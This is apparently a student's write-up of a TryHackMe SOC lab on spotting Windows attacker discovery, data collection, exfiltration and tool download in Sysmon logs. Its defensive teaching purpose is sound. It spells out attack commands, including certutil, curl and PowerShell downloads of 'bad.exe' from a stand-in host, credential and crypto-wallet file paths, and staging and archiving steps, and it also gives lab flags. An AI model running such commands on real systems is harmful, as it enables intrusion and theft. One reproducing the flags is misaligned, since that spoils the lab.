---
title: "Windows Threat Detection 2"
module: "Windows Security Monitoring"
path: "SOC Level 1"
platform: "TryHackMe"
tags: [windows, sysmon, discovery, collection, exfiltration, ingress-tool-transfer, MITRE, event-logs]
status: completed
date: 2026-06-22
date_completed:2026-06-22
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*
<p align="center">
<img src=screenshots/windows_threatdetection2.png width="1500">
</p>

---

## Task 1 - Introduction

After breaching a host, what do attackers do now?!
  - Establish a backdoor for long term access
  - Exploit
  - Move laterally 

---

## Task 2 - Discovery Overview

**Situational Awareness**

Once the attacker gains initial access, what is their next step?
  - Discovery
      - Purpose of the Host
      - Is the Host part of a network
      - Privileges?
      - Think of it as: who am I? where am I? *whoami* or *net user*

<p align="center">
<img src=screenshots/windows_initialaccess.png width="700">
</p>

**Discovery Process**

After a malware attachment is launched, depending on the malware, it connects back to its command center, and a Meterpreter session is launched by the attacker to control the victim's system.

**Meterpreter Session Example**
<p align="center">
<img src=screenshots/windows_meterpreterexample.png width="700">
</p>

| Discovery Purpose | Common CMD / PowerShell Commands |
|---|---|
| Files and Folders | `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>` |
| Users and Groups | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser` |
| System and Apps | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service` |
| Network Settings | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles` |
| Active Antivirus | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |

**1.** Open CMD and type "net user Administrator". Which privileged group does the user belong to?

<p align="center">
<img src=screenshots/windows_netuseradmin.png width="700">
</p>

**Answer:**


**2.** Open Event Viewer and try to find your command in Sysmon logs. What is the "Image" field of the net command you just run?

<p align="center">
<img src=screenshots/windows_eventimage.png width="700">
</p>
Open the log in the Event Viewer: eventvwr.msc /l:"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx"

**Answer: C:\Windows\System32\net.exe**

---

## Task 3 - Detecting Discovery

Most commands are logged as new processes, leaving evidence for SOCs in case of an attack

**Example of the Command Tree Launched from *invoice.pdf.exe***
<p align="center">
<img src=screenshots/windows_invoicecommandtree.png width="700">
</p>

**Example of Command Tree when the Attacker has GUI Access**
<p align="center">
<img src=screenshots/windows_guicommandtree.png width="700">
</p>

**Detecting Discovery**

Commands run in a short period of time could be a dead giveaway of discovery attempts
  - There are some discovery commands that are run by IT departments that are legitimate tools
      - SOCs need to be aware of the IP running these commands so they dont panic over legitimate discovery commands
   
**Build a process tree using Sysmon logs:**
  - **filter** for process creation events
  - **correlate** ProcessId and ParentProcessId fields

**Example**
<p align="center">
<img src=screenshots/windows_sysmontree.png width="700">
</p>

---

**1.** Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?

<p align="center">
<img src=screenshots/windows_runinvoice.png width="700">
</p>
Ran the exe *& "C:\Users\Administrator\Desktop\Practice\Task 3\invoice.pdf.exe"* 

Followed by pulling the log *eventvwr.msc /l"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx"
  - located the first event the invoice.pdf.exe opened, followed up the timeline to spot the first command it ran

<p align="center">
<img src=screenshots/windows_whoami.png width="700">
</p>

**Answer: whoami**

---

**2.** Which command did the malware use to check the presence of MS Defender EDR?

<p align="center">
<img src=screenshots/windows_msdefender.png width="700">
</p>

Continuing the investigation, we follow the timeline up, and we observe multiple commands run by the attacker checking for EDR such as CrowdStrike EDR, and CarbonBlack EDR, and finally MS Defender EDR

**Answer: cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"**

---

**3.** To which domain did the malware send the discovered data?

<p align="center">
<img src=screenshots/windows_msdefender.png width="700">
</p>

**Answer: exfil.beecz.cafe**

---

## Task 4 - Collection Overview

**Searching Secrets**

After attackers have explored the system and found out who the owner is and what defenses they might have, the next step is:
  - Collection
      - personal info, crypto wallets, banking accounts...
  - Credential Access
      - lateral movement in the company
  - Exfiltration

<p align="center">
<img src=screenshots/windows_searchingsecrets.png width="700">
</p>

---

**Common Collection Targets/Paths**

# [Goal: Blackmail Victim] Photos, Chats, Browser History
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

# [Goal: Steal Money] Web Banking Sessions, Crypto Wallets
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# [Goal: Steal Corporate Data] SSH Credentials, Databases
C:\Users\<user>\.ssh\*
C:\Program Files\Microsoft SQL Server\...\DATA\*

---

**Data  Exfiltration**

Attackers will often exfiltrate stolen data to various cloud storage:
  - DropBox, Mega, Amazon S3...
Code Repositories
  - GitHub
Messengers
  - Telegram

---

**1.** What is the Facebook password that the user saved in Chrome?

<p align="center">
<img src=screenshots/windows_chromepass.png width="700">
</p>
Inspect the browser Google Chrome, under passwords and autofill we can find stored passwords

**Answer: nsAghv51BBav90!**


**2.** Which interesting SSH key does the user store on disk?

<p align="center">
<img src=screenshots/windows_sshkey.png width="700">
</p>
Inpected the .ssh folder which displayed 2 files a .key and .pub

**Answer: thm-access-database.key**


**3.** What is the secret PDF file explaining TryHackMe's internal network?

<p align="center">
<img src=screenshots/windows_thmpdf.png width="700">
</p>
Since the instructions provided us a direction to look well isolate the search for those folders:
Get-ChildItem -Path "C:\Users\Administrator\Desktop","C:\Users\Administrator\Downloads","C:\Users\Administrator\Documents" -Recurse -Filter "*.pdf"
In a real-wrold scenario pulling all PDF files would be a nightmare.

**Answer: thm-network-diagram-2025.pdf**

---

## Task 5 - Detecting Collection

Threat actors can view files through the GUI or CLI, however in collection they look for specific files and folders.

SOCs can use the commands below to detect access to certain files:

| Command Example | Description |
|---|---|
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv` | Threat actor used Notepad to read a file of interest |
| `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt` | Searched for keyword in file and redirected output |
| `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf` | Recursively searched for PDF files in user directory |
| `copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\` | Copied Signal chat history to staging directory |
| `Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip` | Archived staged data in preparation for exfiltration |
| `7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*` | Same as above using 7-Zip instead of native PowerShell |

**Collection Example**
  - Notepad and Word documents of interest are opened and captured in the Event Viewer with Event ID 1
  
<p align="center">
<img src=screenshots/windows_wordpad.png width="700">
</p>

**Data Stealing**
  - Data stealers rarely use CMD or Powershell commands, they rely on their own code
      - this makes them harder to track

**Code Example of Data Stealing Telegram Sessions**
<p align="center">
<img src=screenshots/windows_stealingtelegram.png width="700">
</p>

---

**1.** Looking at Sysmon logs, what directory does the stealer create?

<p align="center">
<img src=screenshots/windows_mkdir.png width="700">
</p>
Ran the .\stealer.exe followed by:
eventvwr.msc /l:"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx"
Located the log CommandLine: "C:\Users\Administrator\Desktop\Practice\Task 5\stealer.exe" from this we can investigate the events that follow after.

The next log we can observe the command mkdir.

**Answer:staging_58f1**

---

**2.** Which three file extensions does the malware search for?

<p align="center">
<img src=screenshots/windows_3typesfile.png width="700">
</p>

**Answer: docx, pdf, xlsx**

---

**3.** Which PowerShell cmdlet does the malware use to get clipboard content?

<p align="center">
<img src=screenshots/windows_clipboard.png width="700">
</p>

**Answer: Get-ClipBoard**

---

**4.** Which domain does the malware exfiltrate the data to?

<p align="center">
<img src=screenshots/windows_dnsqueryexfil.png width="700">
</p>
Upon investigating the logs further we can follow the timeline and look for the Event ID 22 which signals DNS query

**Answer: collecteddata-storage-2025.s3.amazonaws.com**

---

## Task 6 - Ingress Tool Transfer

**Ingress Tool Transfer MITRE Techinique ID T1105**

Some attacks provide threat actors with just Initial Access; this means that they might need to download extr tools
  - A script to automate Discovery and find common vulnerabilities like [Seatbelt](https://github.com/GhostPack/Seatbelt)
  - Tool to extract saved passwords or OS credentials [Mimikatz](https://github.com/gentilkiwi/mimikatz)
  - Fully functional Remote Access Trojan RAT - Remcos RAT
  - A ransomware binary to encrypt the system after data is stolen

**Common Transfer Methods**

| Ingress Tool Transfer Method | Command |
|---|---|
| Via Certutil | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` |
| Via Curl (Windows 10+) | `curl.exe https://blackhat.thm/bad.exe -o good.exe` |
| Via PowerShell IWR | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
| Via Graphical Interface | No CMD needed; copy-paste via RDP or download through browser |

**Detecting Tool Transfer**

Transfer reuquires a network connection
  - Threat actors avoid detection by downloading tools from legitimate sites like GitHub
      - SOCs need to analyze which process is making the connection, the destination domain and file being downloaded
**Example:**
<p align="center">
<img src=screenshots/windows_detecttool.png width="700">
</p>


---

**1.** Open the Chrome browser on the VM and navigate to the URL. What is the flag in the response?

<p align="center">
<img src=screenshots/windows_webbrowser.png width="700">
</p>

**Answer: THM{just_use_web_browser}**

---

**2.** Download the file from the same URL using curl.exe. What is the flag in the response?

<p align="center">
<img src=screenshots/windows_certutil.png width="700">
</p>

**Answer:THM{abusing_certutil}**

---

**3.** Download using certutil.exe. What is the flag in the response?

<p align="center">
<img src=screenshots/windows_curliscool.png width="700">
</p>

**Answer:**

---

**4.** Download the same file using PowerShell IWR. What is the flag in the response?

<p align="center">
<img src=screenshots/windows_curlpowershell.png width="700">
</p>

**Answer: THM{power_of_powershell}**

---

## Task 7 - Conclusion

**1.** I am ready to continue the journey!

**Answer:** N/A
